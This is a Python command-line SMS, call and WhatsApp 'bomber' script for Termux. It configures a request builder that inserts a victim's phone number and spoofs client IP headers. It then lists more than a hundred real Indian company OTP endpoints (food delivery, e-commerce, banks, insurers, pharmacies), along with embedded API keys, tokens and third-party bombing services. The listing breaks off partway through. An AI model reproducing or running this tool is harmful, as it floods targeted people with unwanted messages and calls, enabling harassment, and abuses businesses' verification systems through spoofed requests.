#!/usr/bin/env python3
"""
DILJOT BOMBER — Termux Python CLI
Extended API pack
"""

import os
import sys
import time
import random
import uuid
import threading
import shutil
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================================
# COLORS
# ============================================================
class C:
    RESET   = "\033[0m"
    B       = "\033[1m"
    D       = "\033[2m"
    I       = "\033[3m"
    BLINK   = "\033[5m"
    RED     = "\033[38;5;196m"
    DRED    = "\033[38;5;88m"
    GREEN   = "\033[38;5;46m"
    DGREEN  = "\033[38;5;28m"
    YELLOW  = "\033[38;5;226m"
    ORANGE  = "\033[38;5;208m"
    AMBER   = "\033[38;5;214m"
    CYAN    = "\033[38;5;51m"
    DCYAN   = "\033[38;5;30m"
    MAGENTA = "\033[38;5;201m"
    BLUE    = "\033[38;5;39m"
    DBLUE   = "\033[38;5;27m"
    PURPLE  = "\033[38;5;141m"
    VIOLET  = "\033[38;5;99m"
    INDIGO  = "\033[38;5;57m"
    GOLD    = "\033[38;5;220m"
    PINK    = "\033[38;5;213m"
    ROSE    = "\033[38;5;211m"
    GRAY    = "\033[38;5;245m"
    DGRAY   = "\033[38;5;238m"
    WHITE   = "\033[38;5;255m"
    LIME    = "\033[38;5;154m"
    MINT    = "\033[38;5;121m"
    TEAL    = "\033[38;5;44m"
    SKY     = "\033[38;5;117m"
    BG_RED    = "\033[48;5;160m"
    BG_GREEN  = "\033[48;5;28m"
    BG_GOLD   = "\033[48;5;214m"
    BG_PURPLE = "\033[48;5;93m"


def w():
    try: return shutil.get_terminal_size().columns
    except Exception: return 86

def h():
    try: return shutil.get_terminal_size().lines
    except Exception: return 30

def clear():
    os.system("clear" if os.name != "nt" else "cls")

def vlen(s):
    n, esc = 0, False
    for ch in s:
        if esc:
            if ch == "m": esc = False
            continue
        if ch == "\033": esc = True; continue
        n += 1
    return n

def typewrite(text, delay=0.006, color="", end="\n"):
    for ch in text:
        sys.stdout.write(f"{color}{ch}{C.RESET}")
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(end)
    sys.stdout.flush()


# ============================================================
# CONFIG
# ============================================================
MAX_WORKERS     = 40
SMS_MAX_WORKERS = 60
DELAY           = 0.4
SMS_DELAY       = 0.15

BROWSER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-IN,en-GB;q=0.9,en;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
}


# ============================================================
# API CLASS
# ============================================================
class ApiConfig:
    def __init__(self, name, url, method="GET", headers=None, body=None, category="sms"):
        self.name = name
        self.url = url
        self.method = method
        base = dict(BROWSER_HEADERS)
        if headers: base.update(headers)
        self.headers = base
        self.body = body
        self.category = category

    def build(self, phone):
        ts   = str(int(time.time() * 1000))
        uid  = uuid.uuid4().hex
        md5  = uid[:32]
        rid  = uuid.uuid4().hex[:8]
        rpan = random.choice(["ABCDE1234F","GDODJ5434B","GSISB5468H","HSOSN5464B",
                              "FUOUR2389B","VUJVU5675H","TSISV5434B"])
        url, body = self.url, self.body
        for k, v in [("{phone}", phone), ("{number}", phone), ("{timestamp}", ts),
                     ("{uuid}", uid), ("{random_md5}", md5), ("{random_id}", rid),
                     ("{random_pan}", rpan), ("{duration}", "3")]:
            url = url.replace(k, v)
            if body: body = body.replace(k, v)
        headers = dict(self.headers)
        if "X-Forwarded-For" not in headers:
            spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers["X-Forwarded-For"] = spoof
            headers["Client-IP"] = spoof
        return url, headers, body


# ============================================================
# APIS — EXTENDED PACK
# ============================================================
def load_apis():
    apis = []
    J = "application/json"
    F = "application/x-www-form-urlencoded"

    # ============ CALL / IVR ============
    CALLS = [
        ("Swiggy_Call","https://profile.swiggy.com/api/v3/app/request_call_verification","POST",{"Content-Type":J,"Origin":"https://www.swiggy.com","Referer":"https://www.swiggy.com/"},'{"mobile":"{phone}"}'),
        ("TataCapital_Voice","https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","POST",{"Content-Type":J},'{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'),
        ("1MG_Call","https://www.1mg.com/auth_api/v6/create_token","POST",{"Content-Type":J},'{"number":"{phone}","otp_on_call":true}'),
        ("Flipkart_Call","https://2.rome.api.flipkart.com/api/4/user/otp/generate","POST",{"Content-Type":J},'{"mobileNumber":"{phone}"}'),
        ("MagicPin_Call","https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","POST",{"Content-Type":J,"auth-secret-key":"kQLMCQBrfevxhzuPpFWT","origin":"https://magicpin.in","referer":"https://magicpin.in/"},'{"phoneNumber":"91{phone}","authMethod":"call","token":""}'),
        ("Refyne_IVR","https://prod-api.refyne.co.in/auth/v3/send-otp","POST",{"Content-Type":J},'{"channel":"IVR","recipient":"{phone}"}'),
        ("SonyLiv_Voice","https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2","POST",{"Content-Type":J,"app_version":"3.8.3"},'{"mobileNumber":"{phone}","smsType":"Voice","channelPartnerID":"MSMIND","country":"IN","timestamp":"{timestamp}","otpSize":4,"isMobileMandatory":true,"loginType":"REGISTERORSIGNIN"}'),
        ("Snitch_Voice","https://www.snitch.com/api/auth/resend-otp?mode=voice","POST",{"Content-Type":J},'{"mobile_number":"+91{phone}"}'),
        ("Ixigo_Call","https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp","POST",{"Content-Type":F},'token=0732ff21f3263cee48320831c049192e22ffa805b4ca14add9c963945e4de6dde05739779f718e1fe35faa7297ac035389752adfda0548baf249b0d9fdc6a05f&sixDigitOTP=true&prefix=%2B91&phone={phone}&resendOnCall=true'),
        ("MMT_Call","https://www.makemytrip.com/api/umbrella/otp","POST",{"Content-Type":J},'{"mobile":"{phone}"}'),
        ("Rapido_Call","https://rapido.bike/api/v2/otp/generate","POST",{"Content-Type":J},'{"mobile":"{phone}"}'),
        ("Meesho_Call","https://api.meesho.com/v2/auth/send_otp","POST",{"Content-Type":J},'{"phone":"{phone}"}'),
        ("Zomato_Call","https://www.zomato.com/php/asyncLogin.php","POST",{"Content-Type":F},'phone={phone}'),
        ("OYO_Call","https://api.oyoroomscrm.com/api/v2/user/send_otp","POST",{"Content-Type":J},'{"phone":"{phone}"}'),
        ("Astroyogi_Call","https://comm.astroyogi.com/api/OtpComm/SendOtp","POST",{"Content-Type":J,"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9."},'{"phoneCode":"91","countryCode":"IN","mobileNumber":"{phone}","platform":"Web","IpAddress":"117.225.1.174","requestType":"call","countryCodeByHeader":"IN"}'),
    ]
    for n,u,m,hd,b in CALLS:
        apis.append(ApiConfig(n,u,m,hd,b,"call"))

    # ============ WHATSAPP ============
    WAS = [
        ("KPN_WA","https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB","POST",{"Content-Type":J},'{"phone_number":{"number":"{phone}","country_code":"+91"}}'),
        ("EkaCare_WA","https://auth.eka.care/auth/init","POST",{"Content-Type":J},'{"payload":{"allowWhatsapp":true,"mobile":"+91{phone}"},"type":"mobile"}'),
        ("MamaEarth_WA","https://auth.mamaearth.in/v1/auth/initiate-signup","POST",{"Content-Type":J},'{"mobile":"{phone}"}'),
        ("Havells_WA","https://havells.com/otplogin/account/otploginpost/","POST",{"Content-Type":F},"form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on"),
        ("HeroFinCorp_WA","https://loans.apps.herofincorp.com/api/generateOtp","POST",{"Content-Type":J},'{"phone":"{phone}","terms":true,"whatsapp":true}'),
        ("Refyne_WA","https://prod-api.refyne.co.in/auth/v3/send-otp","POST",{"Content-Type":J},'{"channel":"WHATSAPP","recipient":"{phone}"}'),
        ("MMT_WA","https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in&language=eng&currency=inr","POST",{"Content-Type":J,"vid":"{uuid}","tid":"{uuid}","deviceid":"{uuid}"},'{"loginId":"{phone}","type":6,"isEncoded":false,"channel":["MOBILE","WHATSAPP"],"appHashKey":"@www.makemytrip.com #","countryCode":"91"}'),
        ("HERE_WA","https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal","POST",{"Content-Type":J},'{"mobile":"{phone}","countryCodeId":"b43569eb-6798-43fb-8d27-47d55d7c544b","source":"whatsapp"}'),
        ("VisitApp_WA","https://api.getvisitapp.com/v3/new-auth/login-phone","POST",{"Content-Type":J},'{"channel":"whatsapp","resend":true,"countryCode":91,"phone":"{phone}","platform":"WEB"}'),
        ("RegistaniaChar_WA","https://admin.registaniachar.com/api/whatsapp/send-otp","POST",{"Content-Type":J,"X-Signature":"6d31a2232ee5ec6e868d2eade30e657ddce8f6ff4b417818313feef6a220a553"},'{"phone":"{phone}"}'),
    ]
    for n,u,m,hd,b in WAS:
        apis.append(ApiConfig(n,u,m,hd,b,"whatsapp"))

    # ============ SMS — ECOMMERCE / FINTECH / FOOD / TRAVEL / LOAN / EDU ============
    SMS = [
        # ---------- existing core ----------
        ("Lenskart","https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","POST",{"Content-Type":J},'{"phoneCode":"+91","telephone":"{phone}"}'),
        ("NoBroker","https://www.nobroker.in/api/v3/account/otp/send","POST",{"Content-Type":F},"phone={phone}&countryCode=IN"),
        ("PharmEasy","https://pharmeasy.in/api/v2/auth/send-otp","POST",{"Content-Type":J},'{"phone":"{phone}"}'),
        ("Wakefit","https://api.wakefit.co/api/consumer-sms-otp/","POST",{"Content-Type":J},'{"mobile":"{phone}"}'),
        ("ShipRocket","https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send","POST",{"Content-Type":J},'{"mobileNumber":"{phone}"}'),
        ("RentoMojo","https://www.rentomojo.com/api/RMUsers/isNumberRegistered","POST",{"Content-Type":J},'{"phone":"{phone}"}'),
        ("Khatabook","https://api.khatabook.com/v1/auth/request-otp","POST",{"Content-Type":J},'{"phone":"{phone}","app_signature":"wk+avHrHZf2"}'),
        ("RummyCircle","https://www.rummycircle.com/api/fl/auth/v3/getOtp","POST",{"Content-Type":J},'{"mobile":"{phone}","isPlaycircle":false}'),
        ("Revv","https://st-core-admin.revv.co.in/stCore/api/customer/v1/init","POST",{"Content-Type":J},'{"mobile":"{phone}","deviceType":"website"}'),
        ("PayMe_India","https://api.paymeindia.in/api/v2/authentication/phone_no_verify/","POST",{"Content-Type":J},'{"phone":"{phone}","app_signature":"S10ePIIrbH3"}'),
        ("PaisaOnSalary","https://cms.paisaonsalary.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration","POST",{"Content-Type":J},'{"mobile":"{phone}","event_name":"login"}'),
        ("LoanZap","https://webapi.loanzap.in/v2/apply-loan/register-user","POST",{"Content-Type":J},'{"name":"Binod","mobile":"{phone}","email":"test@gmail.com","terms":"1"}'),
        ("Apna","https://production.apna.co/api/userprofile/v1/otp/","POST",{"Content-Type":J},'{"hash_type":"original","phone_number":"91{phone}","request_id":"{timestamp}","retries":0}'),
        ("Moglix","https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2","POST",{"Content-Type":J,"x-platform":"PWA"},'{"email":"","phone":"{phone}","type":"p","source":"signup","buildVersion":"37.3.1","metaSource":"","device":"mobile"}'),
        ("CreditSea","https://backend.creditsea.com/api/v1/otp/generate-otp","POST",{"Content-Type":J,"platform":"CREDITSEA"},'{"phoneNumber":"{phone}","isWebUser":true}'),
        ("Penpencil","https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0","POST",{"Content-Type":J,"client-type":"WEB","client-id":"5eb393ee95fab7468a79d189"},'{"mobile":"{phone}","countryCode":"+91","subOrgId":"SUB-PWLI000"}'),
        ("BajajFinserv","https://apigateway.bajajfinserv.in/apigateway/otp/sso","POST",{"Content-Type":J},'{"mobileNumber":"{phone}","source":"WEB"}'),
        ("Udaan","https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true","POST",{"Content-Type":F,"x-app-id":"udaan-auth"},"mobile={phone}"),
        ("SmartCoin","https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request","POST",{"Content-Type":J,"user_platform":"WEBFLOW","platform_code":"olyv"},'{"phone_number":"{phone}","app_version":"100101","channel":"SMS","request_type":"REGISTRATION","onboarding_consent":true}'),
        ("OLX","https://www.olx.in/api/auth/authenticate?lang=en-IN","POST",{"Content-Type":J,"user-agent":"okhttp/3.9.1"},'{"method":"sms","phone":"{phone}","language":"en-IN","grantType":"retry"}'),
        ("IGP","https://www.igp.com/v2/loginSignup","POST",{"Content-Type":J},'{"email":"","mprefix":"91","mob":"{phone}","cid":"99","claimNumber":false,"newUserFlag":false,"verifyOtp":false,"otp":"","isGuest":false,"isInternational":false}'),
        ("Sephora","https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869","POST",{"Content-Type":J,"authorization":"Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA=="},'{"mobile":"{phone}","country_code":"91"}'),
        ("JioSaavn","https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0","POST",{"Content-Type":J},'{"phone_number":"+91{phone}"}'),
        ("Droom","https://api.droom.in/v1/user/send-otp","POST",{"Content-Type":J},'{"phone":"{phone}","country_code":"91"}'),
        ("Licious","https://www.licious.com/auth/api/v1/sendOtp","POST",{"Content-Type":J},'{"mobile":"{phone}","countryCode":"+91"}'),
        ("Puma","https://in.puma.com/on/demandware.store/Sites-IN-Site/en_IN/Login-OtpRegistration","POST",{"Content-Type":F},"dwfrm_phone={phone}&format=ajax"),
        ("Decathlon","https://www.decathlon.in/api/v1/auth/sendOTP","POST",{"Content-Type":J},'{"mobile":"{phone}","isLogin":true}'),
        ("Groww","https://groww.in/api/v2/auth/otp/send","POST",{"Content-Type":J},'{"phone":"{phone}","platform":"WEB"}'),
        ("RedBus","https://www.redbus.in/api/v2/auth/otp/send","POST",{"Content-Type":J},'{"mobile":"{phone}","source":"web"}'),
        ("ThakurBombCyber","https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}","GET",{},None),
        ("OTPBomber","https://otp-bomber-api.vercel.app/api?phone={phone}","GET",{},None),
        ("Call_API","https://call-api-sable.vercel.app/bomb/{phone}","GET",{},None),
        ("Bomberr","https://bomberr.onrender.com/num={phone}","GET",{},None),

        # ---------- NEW: FOOD / DELIVERY ----------
        ("Dominos","https://pizzaonline.dominos.co.in/api/v2/customer/sendOtp","POST",{"Content-Type":J,"Origin":"https://pizzaonline.dominos.co.in","Referer":"https://pizzaonline.dominos.co.in/"},"{\"mobile\":\"{phone}\"}"),
        ("McDelivery","https://mcdelivery.mcdonaldsindia.com/api/customer/sendOTP","POST",{"Content-Type":J,"Origin":"https://mcdelivery.mcdonaldsindia.com","Referer":"https://mcdelivery.mcdonaldsindia.com/"},"{\"phone\":\"{phone}\"}"),
        ("KFC_India","https://online.kfc.co.in/api/customer/otp/generate","POST",{"Content-Type":J,"Origin":"https://online.kfc.co.in","Referer":"https://online.kfc.co.in/"},"{\"phone\":\"{phone}\"}"),
        ("BurgerKing_IN","https://bkdelivery.in/api/customer/send-otp","POST",{"Content-Type":J,"Origin":"https://bkdelivery.in","Referer":"https://bkdelivery.in/"},"{\"phone\":\"{phone}\"}"),
        ("Faasos","https://faasos.com/api/v2/user/sendOtp","POST",{"Content-Type":J,"Origin":"https://faasos.com","Referer":"https://faasos.com/"},"{\"mobile\":\"{phone}\"}"),
        ("Behrouz","https://behrouzbiryani.com/api/user/sendOtp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("EatFit","https://www.eatfit.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("FreshMenu","https://www.freshmenu.com/api/customer/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Box8","https://box8.in/api/v1/user/sendOtp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("WowMomo","https://wowmomo.com/api/user/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Faasos_2","https://www.faasos.com/api/v2/auth/otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("RebelFoods","https://www.rebelfoods.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: GROCERY / QCOMM ----------
        ("BigBasket","https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/","POST",{"Content-Type":J},"{\"mobile_number\":\"{phone}\"}"),
        ("Blinkit","https://api.grofers.com/v5/otp","POST",{"Content-Type":J,"Origin":"https://blinkit.com","Referer":"https://blinkit.com/"},"{\"phone\":\"{phone}\"}"),
        ("Zepto","https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/","POST",{"Content-Type":J},"{\"mobileNumber\":\"{phone}\"}"),
        ("Dunzo","https://api.dunzo.in/api/v1/auth/otp","POST",{"Content-Type":J},"{\"phone_number\":\"{phone}\"}"),
        ("JioMart","https://www.jiomart.com/api/v1/user/send-otp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Grofers","https://api.grofers.com/v4/otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("NatureBasket","https://www.naturebasket.in/api/send-otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("CountryDelight","https://api.countrydelight.in/api/customer/sendOtp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("MilkBasket","https://www.milkbasket.com/api/v1/user/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Otipy","https://www.otipy.com/api/user/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: ECOMMERCE ----------
        ("Amazon_IN","https://www.amazon.in/ap/signin","POST",{"Content-Type":F},"phone={phone}&action=sendotp"),
        ("Snapdeal","https://www.snapdeal.com/authenticate/otp/send","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("ShopClues","https://www.shopclues.com/api/user/otp/send","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("TataCliq","https://www.tatacliq.com/api/v1/otp/send","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\",\"state\":\"login\"}"),
        ("Nykaa_Fashion","https://www.nykaafashion.com/app-api/index.php/customer/send_otp","POST",{"Content-Type":F},"source=sms&mobile_number={phone}"),
        ("Ajio","https://www.ajio.com/api/otp/generate","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Myntra","https://www.myntra.com/gw/mobile-auth/otp/generate","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Shopsy","https://www.shopsy.in/1.rome/api/1/action/view","POST",{"Content-Type":J},"{\"actionRequestContext\":{\"loginId\":\"{phone}\",\"loginType\":\"MOBILE\",\"verificationType\":\"OTP\",\"type\":\"LOGIN_IDENTITY_VERIFY\"}}"),
        ("Meesho","https://www.meesho.com/api/v1/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("FirstCry","https://www.firstcry.com/api/v2/auth/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Hopscotch","https://www.hopscotch.in/api/user/sendOtp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("NykaaMan","https://www.nykaaman.com/app-api/index.php/customer/send_otp","POST",{"Content-Type":F},"source=sms&mobile_number={phone}"),
        ("Zivame","https://www.zivame.com/auth/public/v1/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\",\"countryCode\":\"IN\"}"),
        ("Clovia","https://www.clovia.com/api/user/send-otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Bewakoof","https://www.bewakoof.com/api/user/login/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("SouledStore","https://www.thesouledstore.com/api/user/send-otp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Redwolf","https://www.redwolf.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Chumbak","https://www.chumbak.com/api/customer/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("FabIndia","https://www.fabindia.com/api/customer/otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: TRAVEL ----------
        ("EaseMyTrip","https://www.easemytrip.com/api/otp/SendOtp","POST",{"Content-Type":J},"{\"Mobileno\":\"{phone}\",\"Type\":\"M\"}"),
        ("Goibibo","https://www.goibibo.com/api/v2/auth/otp/send","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\",\"countryCode\":\"+91\"}"),
        ("Yatra","https://secure.yatra.com/social/common/yatra/action/doMobileLogin","POST",{"Content-Type":F},"mobileNo={phone}"),
        ("Cleartrip","https://www.cleartrip.com/api/v2/auth/otp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Abhibus","https://www.abhibus.com/api/v1/auth/sendOtp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Paytm_Travel","https://travel.paytm.com/api/v2/auth/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("IRCTC","https://www.irctc.co.in/eticketing/protected/mapps1/otp/send","POST",{"Content-Type":J},"{\"mobileNumber\":\"{phone}\"}"),
        ("Confirmtkt","https://www.confirmtkt.com/api/user/sendOtp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("RailYatri","https://www.railyatri.in/api/auth/otp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("ixigo_Train","https://www.ixigo.com/api/v2/user/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: FINTECH / LOANS ----------
        ("KreditBee","https://api.kreditbee.in/api/v2/auth/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("MoneyTap","https://api.moneytap.com/api/v2/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("EarlySalary","https://api.earlysalary.com/api/v2/auth/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("CashE","https://www.cashe.co.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Faircent","https://www.faircent.com/api/user/sendOtp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Lendingkart","https://www.lendingkart.com/api/sendOtp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Indiabulls","https://www.indiabullshomeloans.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("IIFL","https://api.iifl.com/api/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("BajajMarkets","https://www.bajajfinservmarkets.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("PaisaBazaar","https://www.paisabazaar.com/api/v2/auth/send-otp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("RupeeRedee","https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP","POST",{"Content-Type":J,"platform":"Web"},"{\"number\":\"+91{phone}\",\"type\":\"Mobile\"}"),
        ("LoanTap","https://api.loantap.in/api/user/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("ZestMoney","https://api.zestmoney.in/api/user/sendOtp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Slice","https://api.sliceit.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Simpl","https://api.getsimpl.com/api/v3/auth/sendOtp","POST",{"Content-Type":J},"{\"phone_number\":\"{phone}\"}"),
        ("LazyPay","https://api.lazypay.in/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Dhani","https://www.dhani.com/api/v2/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Navi","https://api.navi.com/api/v2/otp/send","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Kissht","https://api.kissht.com/api/v3/auth/send-otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Cashe2","https://api.cashe.co.in/v2/sendOtp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),

        # ---------- NEW: INSURANCE ----------
        ("PolicyBazaar_Ins","https://www.policybazaar.com/api/v2/otp/send","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Acko","https://www.acko.com/api/v2/auth/otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Digit","https://www.godigit.com/api/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("HDFCErgo","https://www.hdfcergo.com/api/send-otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("ICICILombard","https://www.icicilombard.com/api/send-otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("BajajAllianz","https://www.bajajallianz.com/api/v2/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("TataAIG","https://www.tataaig.com/api/v2/send-otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("RelianceGeneral","https://www.reliancegeneral.co.in/api/send-otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: HEALTHCARE / PHARMA ----------
        ("Netmeds","https://www.netmeds.com/api/v2/auth/login/send-otp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("1mg_SMS","https://www.1mg.com/auth_api/v6/create_token","POST",{"Content-Type":J},"{\"number\":\"{phone}\"}"),
        ("Apollo_Pharmacy","https://www.apollopharmacy.in/api/v2/send-otp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("MedPlus","https://www.medplusmart.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Practo","https://www.practo.com/api/v2/auth/send-otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("DocsApp","https://www.docsapp.in/api/v2/send-otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Tata_1mg_Health","https://www.1mg.com/auth_api/v6/send_otp","POST",{"Content-Type":J},"{\"number\":\"{phone}\",\"sendOtpType\":\"sms\"}"),
        ("HealthKart","https://www.healthkart.com/api/customer/sendOtp","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("PharmEasy_2","https://pharmeasy.in/api/v3/auth/send-otp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: EDTECH ----------
        ("BYJUS","https://api.byjus.com/api/v2/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Unacademy","https://unacademy.com/api/v2/user/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Vedantu","https://api.vedantu.com/api/v1/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Toppr","https://api.toppr.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("UpGrad","https://api.upgrad.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("PhysicsWallah","https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189","POST",{"Content-Type":J,"client-type":"WEB","client-id":"5eb393ee95fab7468a79d189"},"{\"mobile\":\"{phone}\",\"countryCode\":\"+91\"}"),
        ("Doubtnut","https://api.doubtnut.com/v4/student/login","POST",{"Content-Type":J},"{\"phone_number\":\"{phone}\",\"language\":\"en\"}"),
        ("CareerWill","https://careerwill.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Examturf","https://api.examturf.com/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),

        # ---------- NEW: RIDE / MOBILITY ----------
        ("Uber_IN","https://auth.uber.com/v2/otp/send","POST",{"Content-Type":J},"{\"mobile\":\"{phone}\"}"),
        ("Ola","https://api.olacabs.com/v2/otp/send","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("BluSmart","https://blusmart.com/api/v2/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("NammaYatri","https://api.nammayatri.in/api/sendOtp","POST",{"Content-Type":J},"{\"phone\":\"{phone}\"}"),
        ("Meru_Cabs","https://merucabapp.com/api/otp/generate","POST",{"Content-Type":F},"mobile_number={phone}"),
